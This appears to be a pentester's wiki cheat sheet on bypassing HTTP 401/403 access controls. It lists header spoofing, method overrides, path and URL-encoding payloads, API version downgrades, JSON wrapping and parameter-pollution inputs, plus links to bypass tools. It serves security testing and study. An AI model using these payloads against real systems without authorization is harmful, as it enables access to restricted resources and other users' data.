# 401 and 403 bypass

### Bypass Techniques

{% stepper %}
{% step %}
### Header-based bypass

_Manipulate headers to spoof the intended path, IP, origin, or host to bypass access restrictions._
{% endstep %}

{% step %}
### HTTP Method Overrides

_Try alternate methods (GET, POST, PUT, DELETE, etc.) when the intended method is restricted._
{% endstep %}

{% step %}
### Path and Encoding Manipulations

_Use techniques like appending slashes, dots, or URL encoding (e.g., `/admin/.`, `/admin%2F`, `/..;/admin`) to bypass route validation. <mark style="color:red;">We can double encode the last character only from w3schools even if it is an alphabet to bypass</mark>._&#x20;

If `/secret` is blocked:&#x20;

* Try using `%2e/secret_` (_if the access is blocked by a proxy, this could bypass the protection_). Try also `_**/%252e**/secret` (_double url encoding_)
* Try `site.com/SECRET`, `site.com/SECRE%54` (_ASCII encoding_), `site.com/secret%00` (_null)_
* _Try_ `site.com/anyfakedir/%2E%2E/secret` _(_`%2E` = `.` _) \[**You can double encode here too]**_
* _Try_ `curl "https://site.com\secret"`
* Use all [this list](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Unicode.txt) in the following situations:&#x20;
  * `/FUZZsecret`
  * `/FUZZ/secret`
  * `secretFUZZ`
* **Other API bypasses:**&#x20;
  * /v3/users\_data/1234 --> 403 Forbidden
  * /v1/users\_data/1234 --> 200 OK
  * {“id”:111} --> 401 Unauthriozied
  * {“id”:\[111]} --> 200 OK
  * {“id”:111} --> 401 Unauthriozied
  * {“id”:{“id”:111\}} --> 200 OK
  * {"user\_id":"\<legit\_id>","user\_id":"\<victims\_id>"} (JSON Parameter Pollution)
  * user\_id=ATTACKER\_ID\&user\_id=VICTIM\_ID (Parameter Pollution)
{% endstep %}

{% step %}
### Token and Cookie Tampering

_Adjust session cookies or tokens (including JWTs) to elevate privileges or modify user roles if possible._&#x20;
{% endstep %}
{% endstepper %}

### Bypass using Automation

* [https://github.com/carlospolop/fuzzhttpbypass](https://github.com/carlospolop/fuzzhttpbypass)
* [https://github.com/Dheerajmadhukar/4-ZERO-3](https://github.com/Dheerajmadhukar/4-ZERO-3)
* [Burp Extension - 403 Bypasser](https://portswigger.net/bappstore/444407b96d9c4de0adb7aed89e826122)

